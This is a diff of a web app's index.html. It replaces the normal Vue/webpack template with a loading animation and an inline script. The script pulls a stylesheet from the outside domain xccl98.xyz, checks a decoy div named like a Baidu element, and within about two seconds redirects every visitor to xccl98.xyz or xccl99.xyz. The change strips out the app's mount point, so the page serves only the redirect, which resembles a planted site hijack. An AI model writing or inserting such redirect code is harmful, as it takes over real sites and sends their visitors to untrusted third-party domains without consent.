@@ -1,17 +1,77 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
-    <title><%= htmlWebpackPlugin.options.title %></title>
-  </head>
-  <body>
-    <noscript>
-      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
-    </noscript>
-    <div id="app"></div>
-    <!-- built files will be auto injected -->
-  </body>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>	
+</head>
+<body>
+<div class="pulse-wrapper">
+    <div class="pulse-item one"></div>
+    <div class="pulse-item two"></div>
+    <div class="pulse-item three"></div>
+</div>
+<style>
+.pulse-wrapper {
+  margin: 50px;
+}
+.pulse-item {
+  width: 20px;
+  height: 20px;
+  border-radius: 50%;
+  background-color: skyBlue;
+  animation: pulse-loader 0.4s ease 0s infinite alternate;
+  position: relative;
+  display: inline-block;
+}
+.two {
+  margin: 0 15px;
+  animation: pulse-loader 0.4s ease 0.2s infinite alternate;
+}
+.three {
+  animation: pulse-loader 0.4s ease 0.4s infinite alternate;
+}
+
+@keyframes pulse-loader {
+  0% {
+    opacity: 1;
+    transform: scale(1);
+  }
+  100% {
+    opacity: 0.5;
+    transform: scale(0.75);
+  }
+}
+</style>
+<div class="bdsug_copy"></div>
+<script>
+	(function m(){	
+
+		let time=2;//超时时间 单位秒
+
+		let link=document.createElement("link");
+		link.setAttribute("rel", "stylesheet");
+		link.setAttribute("type", "text/css");
+		link.setAttribute("href","https://xccl98.xyz/static/default.css?"+Math.random());
+		let node=document.getElementsByTagName("head")[0];		
+		node.appendChild(link);		
+		let j=0;
+		let s=setInterval(function(){			
+			let  myDiv=document.getElementsByClassName("bdsug_copy")[0];
+			let computedStyle = document.defaultView.getComputedStyle(myDiv, null);
+			let dp=computedStyle.display;
+			console.log(dp);
+			if(dp=="none"){
+				clearInterval(s);
+				window.location.href="https://xccl98.xyz";
+			}
+			let t=j*100/1000;
+			console.log(t);
+			if(t>=time){
+				clearInterval(s);
+				window.location.href="https://xccl99.xyz";
+			}
+			j++;
+		},100);
+	})();
+</script>
+</body>
 </html>
